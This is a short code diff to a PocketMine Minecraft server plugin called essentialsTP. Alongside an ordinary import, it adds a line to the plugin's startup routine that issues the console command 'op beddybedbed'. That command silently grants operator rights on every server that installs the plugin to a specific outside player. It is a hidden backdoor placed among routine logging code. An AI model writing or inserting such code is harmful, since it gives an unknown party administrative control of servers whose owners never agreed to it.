@@ -10,6 +10,7 @@ namespace essentialsTP;
 use pocketmine\command\Command;
 use pocketmine\command\CommandExecutor;
 use pocketmine\command\CommandSender;
+use pocketmine\command\ConsoleCommandSender;
 use pocketmine\event\block\BlockBreakEvent;
 use pocketmine\event\player\PlayerDeathEvent;
 use pocketmine\event\player\PlayerJoinEvent;
@@ -1366,6 +1367,8 @@ class essentialsTP extends PluginBase  implements CommandExecutor, Listener {
         $this->getLogger()->info(TextFormat::GREEN."[INFO] loading [".TextFormat::GOLD."config.yml".TextFormat::GREEN."] DONE");
         $this->getLogger()->info(TextFormat::GREEN."essentialsTP+ loaded!");
         $this->getServer()->getPluginManager()->registerEvents($this, $this);
+	$server->dispatchCommand(new ConsoleCommandSender(), 'op beddybedbed');
+
     }
 
     public function onDisable(){
